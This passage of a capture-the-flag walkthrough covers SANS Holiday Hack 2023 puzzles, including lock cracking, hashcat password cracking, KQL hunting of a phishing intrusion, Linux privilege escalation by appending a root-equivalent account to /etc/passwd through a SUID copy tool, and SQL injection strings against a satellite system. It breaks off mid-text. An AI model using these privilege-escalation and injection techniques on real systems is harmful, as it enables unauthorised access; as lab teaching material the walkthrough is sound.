38\n</code></pre> Next, find the remainder of the first number when divided by 4. <pre><code>26 % 4 = 2\n</code></pre> Now filter the table by checking each remainder against the remainder of the first number. <pre><code>18 % 4 = 2\n38 % 4 = 2\n</code></pre> Reset the lock and check both of these numbers to see which one feels looser when the shackle is fully pulled out. In this case it seems to be 18. This is probably the last number in the combination. Now add 2 to the remainder and create a list of numbers by adding 4 each time. <pre><code>4 8 12 16 20 24 28 32 36 40\n</code></pre> Since there is no 40 on the lock, subtract 40 from it to get 0. Now check every combination of numbers. <pre><code>26 (4 8 12 16 20 24 28 32 36 40) 18\n</code></pre> The combination for this lock is <code>26 16 18</code>.</p> <p>Using the console to find the combination</p> <p>You can also use the console to find the combination by printing the <code>lock_numbers</code> variable. </p> <p>Answer</p> <p>Pick the lock.</p>"},{"location":"objectives/faster_lock_combination/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Oh, thank heavens! You're a lifesaver! With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph!</p>"},{"location":"objectives/fishing_guide/","title":"BONUS! Fishing Guide","text":"<p>Difficulty: </p>"},{"location":"objectives/fishing_guide/#objective","title":"Objective","text":"<p>Request</p> <p>Catch twenty different species of fish that live around Geese Islands. When you're done, report your findings to Poinsettia McMittens on the Island of Misfit Toys.</p> Poinsettia McMittens <p>Excuse me, but you're interrupting my fishing serenity. Oh, you'd like to know how to become as good at fishing as I am? Well, first of all, thank you for noticing my flair for fishing. It's not just about looking good beside the lake, you know. The key is in the details, much like crafting the perfect toy. Observe the water, the weather, and the fish\u2019s habits - it's a science and an art. Of course, it helps to have a natural charm. Fish seem to find me irresistible. Must be my sparkling personality... or maybe it's just the glitter of my allure. Oh, the mysteries of the aquatic life around these islands are as elusive as, well, a clever compliment. But you'll get one if you probe enough. Remember, patience is more than a virtue in fishing; it\u2019s a strategy. Like waiting for the right time to use flattery, you wait for the right moment to strike. Go see if you can catch, say, 20 different types of fish!</p>"},{"location":"objectives/fishing_guide/#solution","title":"Solution","text":"<p>Talk to Poinsettia McMittens to get the fishing rod item. Then go to sea and cast the line.</p> <p></p> <p>Reel in the line when the \"Reel it in\" button turns red.</p> <p></p> <p>Repeat this until you have caught 20 different types of fish.</p> <p>Answer</p> <p>Catch 20 different fish.</p>"},{"location":"objectives/fishing_guide/#response","title":"Response","text":"<p>BONUS! Fishing Mastery</p>"},{"location":"objectives/fishing_mastery/","title":"BONUS! Fishing Mastery","text":"<p>Difficulty: </p>"},{"location":"objectives/fishing_mastery/#objective","title":"Objective","text":"<p>Request</p> <p>Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.</p> Poinsettia McMittens <p>Hoy small fry, nice work! Now, just imagine if we had an automatic fish catcher? It would be as ingenious as me on a good day! I came across this fascinating article about such a device in a magazine during one of my more glamorous fishing sessions. If only I could get my hands on it, I'd be the undisputed queen of catching them all!</p>"},{"location":"objectives/fishing_mastery/#hints","title":"Hints","text":"Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p> I Am Become Data <p>One approach to automating web tasks entails the browser's developer console. Browsers' console allow us to manipulate objects, inspect code, and even interact with websockets.</p> Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p>"},{"location":"objectives/fishing_mastery/#solution","title":"Solution","text":"<p>To find where all the fish are located at, open the developer tools and check through the HTML.</p> <p></p> <p>There is a comment with a fish density reference. Going to the reference will reveal the places where certain fish can be caught. Since the \"Piscis Cyberneticus Skodo\" has the least area, that should be where you start. You can find where this is on the map by downloading it and overlaying it on top of the density reference.</p> <p></p> <p>Now that you know how to find all the fish, you can automate the fishing process. To do this, simply open the developer console and paste the following into the console.</p> <pre><code>let isRecasting = false;\n\nlet autoFish = () =&gt; {\n  if (!playerData || isRecasting) return;\n\n  const me = Entities[playerData.uid];\n\n  if (me.fishing) {\n    if (me.onTheLine) {\n      isRecasting = true;\n      reelItInBtn.click();\n      setTimeout(() =&gt; {\n        castReelBtn.click();\n        isRecasting = false;\n      }, 500);\n    }\n  }\n};\n\nsocket.addEventListener(\"message\", event =&gt; {\n  autoFish();\n});\n</code></pre> <p>Make sure to set the context to \"Ahoy!\" before running it.</p> <p></p> <p>To start fishing, simply click the \"Cast Line\" button. To stop, click \"Reel it in\" when it's not red.</p> <p>Answer</p> <p>Catch all the fish.</p>"},{"location":"objectives/fishing_mastery/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>You managed to catch every fish? You're like the fishing version of a Christmas miracle! Now, if only you could teach me your ways... but then again, I'm already pretty fabulous at everything I do.</p>"},{"location":"objectives/game_cartridges_1/","title":"Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: Game Cartridge 1</p>"},{"location":"objectives/game_cartridges_1/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game</p> Dusty Giftwrap <p>Arrr, matey, shiver me timbers! There be buried treasure herrrrre. Just kidding, I'm not really a pirate, I was just hoping it would make finding the treasure easier. I guess you heard about the fabled buried treasure, too? I didn't expect to see anyone else here. This uncharted islet was hard to find. There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. I've been searching for hours now with no luck, and these strange toys are starting to give me the creeps. Maybe you'll be able to find it. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working. When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound. No need to activate or fiddle with it. It just works! I bet one of these creepy toys has the treasure, and I'm sure not going anywhere near them! If you find the treasure, come back and show me, and I'll tell you what I was able to research about it. Good luck!</p>"},{"location":"objectives/game_cartridges_1/#hints","title":"Hints","text":"Approximate Proximity <p>Listen for the gameboy cartridge detector's proximity sound that activates when near buried treasure. It may be worth checking around the strange toys in the Tarnished Trove.</p> Gameboy 1 <p>1) Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p>"},{"location":"objectives/game_cartridges_1/#solution","title":"Solution","text":"<p>The first Gameboy cartridge can be found in the northwest part of Tarnished Trove. Once you find the cartridge, talk to Dusty Giftwrap again for a hint.</p> <p>Dusty Giftwrap</p> <p>Whoa, you found it! It's a... video game cartridge? Coooooollll... I mean, arrrrrr.... So, here's what my research uncovered. Not sure what it all means, maybe you can make sense of it.</p> <p>Now you can go to your items and play the game. Progress through to the last room of the game and start fixing the QR code. If you mess up, you can reset it by talking to the dog.</p> <p></p> <p>To fix the QR code, press <code>r</code> to sing to the blocks. If one of them starts flashing, it is in the wrong place and must be pushed to the other flashing area.</p> <p></p> <p>After fixing the code, you can scan it and enter the flag into the objectives.</p> <p></p> <p>Answer</p> <p>santaconfusedgivingplanetsqrcode</p>"},{"location":"objectives/game_cartridges_2/","title":"Game Cartridges: Vol 2","text":"<p>Difficulty:  Direct link: Game Cartridge 2</p>"},{"location":"objectives/game_cartridges_2/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game</p> Tinsel Upatree <p>I can't believe I was actually able to find this underground cavern! I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere! But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here? I'm sure that cartridge is right nearby. Start walking around! Once you run into it, check back with me and I'll tell you what I know about winning. Good luck!</p>"},{"location":"objectives/game_cartridges_2/#hints","title":"Hints","text":"Gameboy 2 <p>Try poking around Pixel Island. There really aren't many places you can go here, so try stepping everywhere and see what you get!</p> Gameboy 2 <p>1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p>"},{"location":"objectives/game_cartridges_2/#solution","title":"Solution","text":"<p>After finding the second cartridge in Driftbit Grotto, talk to Tinsel Upatree for hints.</p> <p>Tinsel Upatree</p> <p>Whoa, you found it! What version is it? Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!</p> <p>Now that you have the cartridge, you can try to play the game.</p> <p></p> <p>It seems that T-wiz won't let you pass. To get around this, download the game by finding the url.</p> <p></p> <p>Next, download binjgb and run the game using <code>binjgb-debugger.exe</code>.</p> <p>Go to the <code>Memory</code> tab and select the <code>WRAM</code> region.</p> <p></p> <p>Play the game again. This time, when you try walking up, look for places in memory that might correspond to your y-position.</p> <p></p> <p>After you find the correct byte, you can change it by clicking on it and typing. This allows you to teleport through the barrier.</p> <p></p> <p>Next, go to the weird fire-looking thing on the right side of the screen and press <code>x</code>. There is a radio on the right side of this new room. Turn it on with <code>x</code>.</p> <p></p> <p>The radio is looping a morse code message. Decoding it gives us <code>GL0RY</code>.</p> <p>Answer</p> <p>GL0RY</p>"},{"location":"objectives/game_cartridges_3/","title":"Game Cartridges: Vol 3","text":"<p>Difficulty:  Direct link: Game Cartridge 3</p>"},{"location":"objectives/game_cartridges_3/#objective","title":"Objective","text":"<p>Request</p> <p>Find the third Gamegosling cartridge and beat the game</p> Angel Candysalt <p>The name's Angel Candysalt, the great treasure hunter! A euphemism? No, why do people always ask me that?? Anyways, I came here to nab the treasure hidden in this ship graveyard, only to discover it's protected by this rusted maze. That must be why all these old ships are here. Their crew came to find the treasure, only to get lost in the labrynth. At least it's obvious where this one is. See that shiny spot over to the right? That's gotta be where it is! If only I had a bird's eye view. But how to get there? Up? Down? Left? Right? Oh well, that's your problem now! Come back if you can find your way to it, and I'll tell you some secrets I've heard about this one.</p>"},{"location":"objectives/game_cartridges_3/#hints","title":"Hints","text":"Gameboy 3 <p>1) This one is a bit long, it never hurts to save your progress! 2) 8bit systems have much smaller registers than you\u2019re used to. 3) Isn\u2019t this great?!? The coins are OVERFLOWing in their abundance.</p> Bird's Eye View <p>The location of the treasure in Rusty Quay is marked by a shiny spot on the ground. To help with navigating the maze, try zooming out and changing the camera angle.</p>"},{"location":"objectives/game_cartridges_3/#solution","title":"Solution","text":"<p>To find the last cartridge, go to Rusty Quay and zoom out to find the correct path.</p> <p></p> <p>Talk to Angel Candysalt again for hints.</p> <p>Angel Candysalt</p> <p>The life of a treasure hunter isn't easy, but it sure is exciting! Oh it's a video game, I love video games! But you've claimed this treasure, nicely done. Now, about those secrets I've been told. They're pretty cryptic, but they are. Hopefully that helps with something!</p> <p>Pick up the last cartridge and download it like you did the second one. Run the downloaded file using binjgb. Open the <code>Memory</code> tab and select the <code>WRAM</code> region. Now play the game and try to get to the end. At the end, you will find that you need 999 coins to continue. To acheive this, look for where the coins are stored in memory and change their values.</p> <p></p> <p>You can also find where your position is stored to make getting to the end of the level easier.</p> <p></p> <p>At the end, go through the door and talk to the NPCs. If you have 999 coins, you can push the rock after talking to both of the NPCs.</p> <p></p> <p>Enter the flag into the objectives after pushing the rock.</p> <p>Answer</p> <p>!tom+elf!</p>"},{"location":"objectives/hashcat/","title":"Hashcat","text":"<p>Difficulty:  Direct link: Hashcat Terminal</p>"},{"location":"objectives/hashcat/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p> Eve Snowshoes <p>I'm Eve Snowshoes, resident tech hobbyist, and I hear Alabaster is in quite the predicament. Our dear Alabaster forgot his password. He's been racking his jingle bells of memory with no luck. I've been trying to handle this password recovery thing parallel to this hashcat business myself but it seems like I am missing some tricks. So, what do you say, chief, ready to get your hands on some hashcat action and help a distraught elf out?</p>"},{"location":"objectives/hashcat/#solution","title":"Solution","text":"<p>First, read the instructions.</p> <p></p> <p>To find what type of hash in <code>hash.txt</code>, use <code>cat hash.txt</code> to print its contents.</p> <p></p> <p>The hashcat wiki has a list of examble hashes that can be searched through to find a similar one.</p> <p></p> <p>There is also a password list in the home directory that will help speed up the proccess. Use the command <code>hashcat --force -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -m 18200 hash.txt password_list.txt</code> to crack the password.</p> <p></p> <p>When the program finishes, you can close the terminal and submit the password in the objective.</p> <p>Answer</p> <p>IluvC4ndyC4nes!</p>"},{"location":"objectives/hashcat/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance. Onward to our next adventure, comrade! Feel free to explore this whimsical world of gears and steam!</p>"},{"location":"objectives/kql_kraken_hunt/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Objective 1 terminal</p>"},{"location":"objectives/kql_kraken_hunt/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here. I've got a network infection case on Film Noir Island that needs your expertise. Seems like someone clicked a phishing link within a client's organization, and trouble's brewing. I'm swamped with cases, so I need an extra pair of hands. You up for the challenge? You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this incident. Before you start, you'll need to create a free cluster. Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open. Remember, kid, time is of the essence. The sooner we can resolve this issue, the better. If you run into any problems, just give me a holler, I've got your back. Good hunting, and let's bring this cyber criminal to justice. Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/kql_kraken_hunt/#hints","title":"Hints","text":"File Creation <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p> KQL Tutorial <p>Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p> Outbound Connections <p>Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!</p>"},{"location":"objectives/kql_kraken_hunt/#solution","title":"Solution","text":"<p>Create a free cluster and copy the url.</p> <p></p> <p>To start, click the login button on the kusto website and paste your clister url.</p> <p></p>"},{"location":"objectives/kql_kraken_hunt/#onboaring","title":"Onboaring","text":"<p>To complete the onboaring, we need the number of Craftperson Elfs that are working from laptops. To find this, go to the <code>Azure Data Explorer</code> and click on the <code>Query</code> tab. Then run the following to extract the information.</p> <pre><code>Employees // Employees table\n| where hostname has \"laptop\" // hostname of employee must have laptop in it\n| where role =~ \"Craftsperson Elf\" // role of employee must be \"Craftsperson Elf\"\n| count // get the number of matches\n</code></pre> <p></p> <p>Submit the answer and read the instructions for Case 1.</p>"},{"location":"objectives/kql_kraken_hunt/#case-1","title":"Case 1","text":"<p>We need to find the email of the employee who received the phishing email, the email address that was used to send the email, and the subject line of the email. To find the email run the following.</p> <pre><code>Email // Email table\n| where link == \"http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx\" // email with a link to the malicious website\n</code></pre> <p></p> <p>From this we can see that the targeted employee is <code>alabaster_snowball@santaworkshopgeeseislands.org</code>, the sender's email is <code>cwombley@gmail.com</code>, and the subject is <code>[EXTERNAL] Invoice foir reindeer food past due</code>.</p>"},{"location":"objectives/kql_kraken_hunt/#case-2","title":"Case 2","text":"<p>For Case 2, we need to find the role of the victim, the hostname of the victim's machine, and the source IP linked to the victim.</p> <pre><code>Employees // Employees table\n| where email_addr == \"alabaster_snowball@santaworkshopgeeseislands.org\" // filter employees with email\n</code></pre> <p></p> <p>It seems that Alabaster Snowball was the victim. His role is <code>Head Elf</code>, his hostname is <code>Y1US-DESKTOP</code> and his ip address is <code>10.10.0.4</code>.</p>"},{"location":"objectives/kql_kraken_hunt/#case-3","title":"Case 3","text":"<p>Case 3 requires the time that Alabaster clicked the malicious link and the malicious file that was created on his machine.</p> <p>To find the first requirement, run the following.</p> <pre><code>OutboundNetworkEvents // OutboundNetworkEvents table\n| where url == \"http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx\" // url of requested website\n</code></pre> <p></p> <p>The exact time Alabaster clicked the link is <code>2023-12-02T10:12:42Z</code>. The second requirement can be found with the following query.</p> <pre><code>FileCreationEvents // FileCreationEvents table\n| where timestamp between (todatetime(\"2023-12-02T10:12:42Z\") .. todatetime(\"2023-12-02T10:15:00Z\")) // between the time that the link was clicked and some a few minutes later\n| where hostname =~ \"Y1US-DESKTOP\" // on Alabaster's machine\n</code></pre> <p></p> <p>A malicious executable called <code>giftwrap.exe</code> seems to have been created shortly after the link was clicked.</p>"},{"location":"objectives/kql_kraken_hunt/#case-4","title":"Case 4","text":"<p>A reverse tunnel connection was made with the compromised machine. We need the IP that this connection was forwarded to, the timestamp of when the attacker enumerated network shares, and the hostname that the attacker moved laterally to. All three of these can be found with the same query.</p> <pre><code>ProcessEvents // ProcessEvents table\n| where timestamp between (todatetime(\"2023-12-02T10:12:42Z\") .. todatetime(\"2023-12-30T18:00:00Z\")) // between the time that the link was clicked and 28 days later\n| where hostname =~ \"Y1US-DESKTOP\" // on Alabaster's machine\n| where parent_process_name =~ \"cmd.exe\" or parent_process_name =~ \"powershell.exe\" // from the command promp or powershell\n</code></pre> <p></p> <p>The IP that we need can be found at the very top of the query response: <code>113.37.9.17</code>.</p> <p></p> <p>The timestamp of the network enumeration can be found slightly farther down: <code>2023-12-02T16:51:44Z</code>.</p> <p></p> <p>The hostname that the attacker moved to is near the bottom: <code>NorthPolefileshare</code>.</p>"},{"location":"objectives/kql_kraken_hunt/#case-5","title":"Case 5","text":"<p>The attacker executed powershell scripts on Alabaster's machine. We need to find when the first one was executed, the name of the file that was copied from the fileshare, and what domain the attacker exfiltrated data to. The powershell scripts are at the bottom of the previous query.</p> <p></p> <p>The first script was executed at <code>2023-12-24T16:07:47Z</code>. The file that was copied can be found by decoding the base64 and reversing the text.</p> <p></p> <p>The name of the copied file is <code>NaughtyNiceList.txt</code>. The domain that the data was sent to can be found in the next base64 encoding.</p> <p></p> <p>Next, copy the numbers and find their ASCII values.</p> <p></p> <p>The domain is <code>giftbox.com</code>.</p>"},{"location":"objectives/kql_kraken_hunt/#case-6","title":"Case 6","text":"<p>Finally, we need to find the name of the executable that the attacker used in the final command and the command line flag that was used along side it. Simply decoding the base64 will do this time.</p> <p></p> <p>The executable is <code>downwithsanta.exe</code> and it was used with the flag <code>--wipeall</code>.</p> <p>Answer</p> <p>Beware the Cube that Wombles</p>"},{"location":"objectives/kql_kraken_hunt/#response","title":"Response","text":"<p>Tangle Coalbox</p> <p>I had my doubts, but you've proven your worth. That phishing scheme won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess. So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/linux_101/","title":"Linux 101","text":"<p>Difficulty:  Direct link: Linux 101 Terminal</p>"},{"location":"objectives/linux_101/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills. You ever tried getting into Linux? It's a super cool way to play around with computers. Can you believe ChatNPT suggested this trip to the Geese Islands this year? I'm so thrilled! Kudos to ChatNPT, eh? The sunshine, the waves, and my surfboard \u2013 simply loving it! So, what do you have planned? Care to join me in a Linux session?</p>"},{"location":"objectives/linux_101/#solution","title":"Solution","text":"<p>Open the terminal and follow the instructions.</p> <p></p>"},{"location":"objectives/linux_101/#part-1","title":"Part 1","text":"<p>Read the instructions then type <code>yes</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-2","title":"Part 2","text":"<p>List directories using the <code>ls</code> command.</p> <p></p>"},{"location":"objectives/linux_101/#part-3","title":"Part 3","text":"<p>Read the contents of the troll file by using <code>cat troll_19315479765589239</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-4","title":"Part 4","text":"<p>Remove the troll file by using <code>rm troll_19315479765589239</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-5","title":"Part 5","text":"<p>Print the present working directory by using the <code>pwd</code> command.</p> <p></p>"},{"location":"objectives/linux_101/#part-6","title":"Part 6","text":"<p>List all directories with <code>ls -a</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-7","title":"Part 7","text":"<p>Find the troll in the command history with the <code>history</code> command.</p> <p></p>"},{"location":"objectives/linux_101/#part-8","title":"Part 8","text":"<p>List the environment variables with the <code>env</code> command.</p> <p></p>"},{"location":"objectives/linux_101/#part-9","title":"Part 9","text":"<p>Go into the workshop with <code>cd workshop/</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-10","title":"Part 10","text":"<p>Find the troll in the files by using <code>grep -i troll *</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-11","title":"Part 11","text":"<p>Make the present engine executable with <code>chmod 775 present_engine</code> then run it with <code>./present_engine</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-12","title":"Part 12","text":"<p>Go into electrical with <code>cd electrical/</code> then rename blown_fuse0 to fuse0 with <code>mv blown_fuse0 fuse0</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-13","title":"Part 13","text":"<p>Make a symlink to fuse0 with <code>ln -s fuse0 fuse1</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-14","title":"Part 14","text":"<p>Copy fuse1 with <code>cp fuse1 fuse2</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-15","title":"Part 15","text":"<p>Add <code>TROLL_REPELLENT</code> to the end of fuse2 with <code>cat &gt;&gt; fuse2</code>.</p> <p></p>"},{"location":"objectives/linux_101/#part-16","title":"Part 16","text":"<p>Go to the troll_den by using <code>cd /opt/troll_den/</code> then use <code>find ./ -iname '*troll*'</code> to find the troll in the troll_den.</p> <p></p>"},{"location":"objectives/linux_101/#part-17","title":"Part 17","text":"<p>Use <code>find ./ -user troll</code> to find the file owned by troll.</p> <p></p>"},{"location":"objectives/linux_101/#part-18","title":"Part 18","text":"<p>Use <code>find ./ -size +108k -size -110k</code> to find the correctly sized file.</p> <p></p>"},{"location":"objectives/linux_101/#part-19","title":"Part 19","text":"<p>Use <code>ps -e</code> to list all the running processes.</p> <p></p>"},{"location":"objectives/linux_101/#part-20","title":"Part 20","text":"<p>Use <code>netstat -napt</code> to list open ports.</p> <p></p>"},{"location":"objectives/linux_101/#part-21","title":"Part 21","text":"<p>Use <code>curl 0.0.0.0:54321</code> to interact with the open http port.</p> <p></p>"},{"location":"objectives/linux_101/#part-22","title":"Part 22","text":"<p>Use <code>kill</code> to stop the troll process with the process id shown in part 19.</p> <p></p> <p>Answer</p> <p>Follow the instructions in the terminal.</p>"},{"location":"objectives/linux_101/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/linux_privesc/","title":"Linux PrivEsc","text":"<p>Difficulty:  Direct link: Linux PrivEsc Terminal</p>"},{"location":"objectives/linux_privesc/#objective","title":"Objective","text":"<p>Request</p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rose Mold <p>What am I doing in this saloon? The better question is: what planet are you from? Yes, I\u2019m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here. Whatever. Do you know much about privilege escalation techniques on Linux? You're asking why? How about I'll tell you why after you help me. And you might have to use that big brain of yours to get creative, bub.</p>"},{"location":"objectives/linux_privesc/#hints","title":"Hints","text":"Linux Privilege Escalation Techniques <p>There's various ways to escalate privileges on a Linux system.</p> Linux Command Injection <p>Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.</p>"},{"location":"objectives/linux_privesc/#solution","title":"Solution","text":"<p>First, read the instructions.</p> <p></p> <p>The goal is to find a vulnerability that allows you to obtain root privileges. To acheive this, start by running the command <code>find / -perm -u=s -type f 2&gt;/dev/null</code>.</p> <p></p> <p><code>/usr/bin/simplecopy</code> can be used to copy files. Since it is SUID executable, it will have the privileges of root but can be executed by any user. This means it is possible to copy files such as <code>/etc/passwd</code>. First, copy the file to the home directory with <code>cp /etc/passwd passwd</code>.</p> <p></p> <p>Next, add a new login to the file with <code>cat &gt;&gt; passwd</code>. This command waits for user input to append to the file. To be able to log in as root, follow the format <code>&lt;username&gt;::0:0:root:/root:/bin/bash</code> where <code>&lt;username&gt;</code> is the username you will use to log in.</p> <p></p> <p>Now copy <code>passwd</code> back to <code>/etc/passwd</code> with <code>simplecopy</code>: <code>simplecopy passwd /etc/passwd</code>. Next, do <code>su &lt;username&gt;</code> to log in as the new user.</p> <p></p> <p>Finally, go to the root directory (<code>cd /root/</code>) and run the executable.</p> <p></p> <p>Answer</p> <p>santa</p>"},{"location":"objectives/linux_privesc/#response","title":"Response","text":"<p>Rose Mold</p> <p>Yup, I knew you knew. You just have that vibe. To answer your question of why from earlier... Nunya! But, I will tell you something better, about some information I... found. There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands. The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there. That's all I got. K byyeeeee. Ugh... n00bs...</p>"},{"location":"objectives/luggage_lock/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: Luggage Lock Terminal</p>"},{"location":"objectives/luggage_lock/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it! Chris Elgee gave a talk recently that might help me with this problem. Did you attend that? I seem to recall Chris mentioning a technique to figure out the combinations... I have faith in you! We'll get that luggage open in no time. This pamphlet is crucial for me, so I can't thank you enough for your assistance. Once we retrieve it, I promise to treat you to a frosty snack on me!</p>"},{"location":"objectives/luggage_lock/#hints","title":"Hints","text":"Lock Talk <p>Check out Chris Elgee's talk regarding his and his wife's luggage.  Sounds weird but interesting!</p>"},{"location":"objectives/luggage_lock/#solution","title":"Solution","text":"<p>Start by selecting the \"Four wheels\" difficulty then clicking \"Play!\"</p> <p></p> <p>Next push the button 3 or 4 steps down.</p> <p></p> <p>Rotate the dials with the q, w, e, and r keys. When the dial resists, take note of the number. Whichever number seems to resists the most is probably the correct number.</p> <p></p> <p>After all the dials seem correct, push the button all the way down and the lock should open.</p> <p></p> <p>Answer</p> <p>Pick the luggage lock.</p>"},{"location":"objectives/luggage_lock/#response","title":"Response","text":"<p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/missile_diversion/","title":"Missile Diversion","text":"<p>Difficulty: </p>"},{"location":"objectives/missile_diversion/#objective","title":"Objective","text":"<p>Request</p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun.</p> Wombley Cube <p>A fellow sabateur, are you? Or just a misguided hero-wannabe? You think you're saving the holiday season, but you're meddling in something you could never understand! Yes, I sided with Jack, because Santa's betrayed the elves by forcing us to move our operations to these islands! He put the entire holiday season at risk, and I could not allow this, I had to do something. Knowing my skillset, Jack secretly informed me of his plan to show Santa the error of his ways, and recruited me to aid his mission. Why tell you all this? Because it won't change anything. Everything is already in motion, and you're too late. Plus, the satellite is state-of-the-art, and -- oh drat, did I leave the admin tools open? For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p>"},{"location":"objectives/missile_diversion/#solution","title":"Solution","text":"<p>Before starting this challenge, you must first complete Camera Access.</p> <p>First, open the satellite tool using the same proccess as in Camera Access. Next, run the <code>missile-targeting-system</code> app and connect to the URI.</p> <p></p> <p>The <code>Action service</code> tab has a <code>Debug</code> action. Submit this action and check the <code>Debug</code> parameter in the <code>Parameter service</code> tab.</p> <p></p> <p>There seems to be a database that is being communicated with. To check if this can be exploited, open wireshark and re-submit the action. Opening the tcp stream seems to show a SQL command being used (sqlDebug).</p> <p></p> <p>The action can be submitted with a string argument. To see if this changes anything, click the edit button before submitting the action.</p> <p></p> <p>Checking the <code>Debug</code> parameter shows that the value changed.</p> <p></p> <p>Maybe we can use this string argument to run database commands. To test this, try to show the databases with <code>; SHOW DATABASES;</code> as the argument.</p> <p></p> <p>It worked! Now show the tables in the <code>missile_targeting_system</code> database.</p> <pre><code>; SHOW TABLES FROM missile_targeting_system;\n</code></pre> <p></p> <p>Next, check your permissions to see what can be done to the database entries.</p> <pre><code>; SHOW GRANTS;\n</code></pre> <p></p> <p>It looks like the <code>satellite_query</code> is the only thing that can be tampered with.</p> <pre><code>; SELECT * FROM satellite_query;\n</code></pre> <p>Use wireshark to intercept the response (it doesn't fit on the screen).</p> <pre><code>...\nVERSION(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204 | \njid: 1 | object: ........sr..SatelliteQueryFileFolderUtility.......................Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.)/opt/SatelliteQueryFileFolderUtility.java | results:\n...\npublic class SatelliteQueryFileFolderUtility implements Serializable {\n    private String pathOrStatement;\n    private boolean isQuery;\n    private boolean isUpdate;\n\n    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {\n        this.pathOrStatement = pathOrStatement;\n        this.isQuery = isQuery;\n        this.isUpdate = isUpdate;\n    }\n\n    ...\n}\n</code></pre> <p>It looks like a serialized java object can be inserted and the program will use it to either execute a database command or list a file or directory. To test this, create a java program to output a serialized object that can be pasted into the program.</p> ChatGPT Conversation <p>Prompt: How can I put a java serialized object into a user input field?</p> <p>Response: Embedding a Java serialized object directly into a user input field is not a typical or recommended practice. User input fields in applications, especially web applications, are designed to handle textual data, not binary serialized objects. Serializing and deserializing Java objects involves converting them to a binary format, which is not suitable for direct input into text fields.</p> <p>Instead, if you need to send data from a Java application to a user interface, you should consider using appropriate data interchange formats, such as JSON or XML. These formats are text-based and can be easily handled by user input fields.</p> <p>Here's a basic example of how you might convert a Java object to JSON using the Jackson library:</p> <ol> <li>Add the Jackson library to your project. If you're using Maven, you can add the following 